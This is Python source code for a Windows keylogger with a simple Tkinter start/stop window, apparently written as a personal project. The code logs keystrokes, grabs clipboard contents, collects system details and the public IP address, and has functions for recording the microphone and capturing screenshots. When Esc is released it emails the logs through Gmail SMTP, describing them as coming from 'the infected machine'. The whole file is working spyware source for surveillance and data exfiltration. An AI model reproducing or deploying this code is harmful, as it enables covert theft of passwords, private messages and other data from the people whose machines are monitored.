from tkinter import *
from tkinter import messagebox
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import socket
import platform
import win32clipboard
from pynput.keyboard import Key, Listener
import time
import os
from scipy.io.wavfile import write
import sounddevice as sd
from cryptography.fernet import Fernet
import getpass
from requests import get
from multiprocessing import Process, freeze_support
from PIL import ImageGrab
import traceback

keys_information = "key_log.txt"
system_information = "systeminfo.txt"
clipboard_information = "clipboard.txt"
audio_information = 'audio.wav'
screenshot_information = "screenshot.png"

email_address = "enter_your_gmail"
password = 'enter_your_password'
toaddr = '_enter_your_gmail'

microphone_time = 10
time_iteration = 15
number_of_iterations_end = 3

key = "QiWaDdEwBm5MyCakr9spyD0d0Cfiu9CgtpE85uwzFB0="
file_path = "C:\\Users\\Arundhati Shukla\\PycharmProjects\\keylogger\\project"
extend = "\\"
file_merge = file_path + extend

attachments = [
    file_path + extend + system_information,
    file_path + extend + clipboard_information,
    file_path + extend + audio_information,
    file_path + extend + screenshot_information,
    file_path + extend + keys_information
]

attachment_types = [
    'text/plain',
    'text/plain',
    'text/plain',
    'text/plain',
    'text/plain'
]


def send_email(filename, attachments, attachment_types, toaddr):
    try:
        fromaddr = email_address
        msg = MIMEMultipart()
        msg['From'] = fromaddr
        msg['To'] = toaddr
        msg['Subject'] = "Complete Log"
        body = "This mail has all keylogger log files of the infected machine"
        msg.attach(MIMEText(body, 'plain'))
        for attachment, attachment_type in zip(attachments, attachment_types):
            attachment_file = open(attachment, 'rb')
            p = MIMEBase('application', 'octet-stream')
            p.set_payload(attachment_file.read())
            encoders.encode_base64(p)
            p.add_header('Content-Disposition', 'attachment; filename=%s' % os.path.basename(attachment))
            p.add_header('Content-Type', attachment_type)
            msg.attach(p)
            attachment_file.close()
        s = smtplib.SMTP('smtp.gmail.com', 587)
        s.starttls()
        s.set_debuglevel(1)
        s.login(fromaddr, password)
        text = msg.as_string()
        s.sendmail(fromaddr, toaddr, text)
        s.quit()
    except Exception as e:
        # Print or log the error message and traceback
        print("An error occurred while sending email attachment:")
        print(e)
        traceback.print_exc()


def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address" + public_ip)
        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query")

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + '\n')
        f.write("Hostname: " + hostname + '\n')
        f.write("Private IP Address: " + IPAddr + IPAddr + '\n')


def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clopbaord Data: \n" + pasted_data)

        except:
            f.write("Clipboard could not be copied")


def microphone():
    fs = 44100
    seconds = microphone_time

    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()
    write(file_path + extend + audio_information, fs, myrecording)


def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)


def on_press(key):
    global keys, count

    print(key)
    keys.append(key)
    count += 1

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []
def write_file(keys):
    with open(file_path + extend + keys_information, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
                f.close()
            elif k.find("Key") == -1:
                f.write(k)
                f.close()
def on_release(key):
    if key == Key.esc:
        # Stop listener
        listener.stop()

        # Send the email with all attachments
        copy_clipboard()
        computer_information()
        send_email('Logs', attachments, attachment_types, toaddr)

        # Show message box
        messagebox.showinfo("Keylogger", "Logs have been sent via email.")

        return False


def start_keylogger():
    global keys, count, listener
    # Reset variables
    keys = []
    count = 0
    # Create the listener object
    listener = Listener(on_press=on_press, on_release=on_release)
    # Start the listener
    listener.start()
def stop_keylogger():
    global listener

    # Stop the listener
    if listener:
        listener.stop()
        listener = None
# Create the GUI application
root = Tk()
root.title("Keylogger")

# Create the start button
start_button = Button(root, text="Start Keylogger", command=start_keylogger)
start_button.pack(pady=10)

# Create the stop button
stop_button = Button(root, text="Stop Keylogger", command=stop_keylogger)
stop_button.pack(pady=5)

# Run the GUI application
root.mainloop()
